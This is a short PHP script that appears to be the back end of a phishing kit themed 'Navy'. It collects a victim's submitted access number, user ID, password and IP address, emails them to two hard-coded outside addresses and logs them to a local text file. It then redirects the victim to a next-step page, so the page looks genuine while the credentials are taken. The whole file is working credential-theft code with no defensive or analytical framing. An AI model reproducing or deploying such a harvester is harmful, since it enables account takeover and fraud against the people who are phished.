<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Navy Pics Info-----------------------\n";
$message .= "Access Number             : ".$_POST['formtext1']."\n";
$message .= "User ID            : ".$_POST['formtext2']."\n";
$message .= "Password             : ".$_POST['formtext3']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "malla4142@gmail.com,md.ed@aol.com";
$subject = "Navy";
$headers = "From: Navy<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("usew.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: step1.html");

	 
?>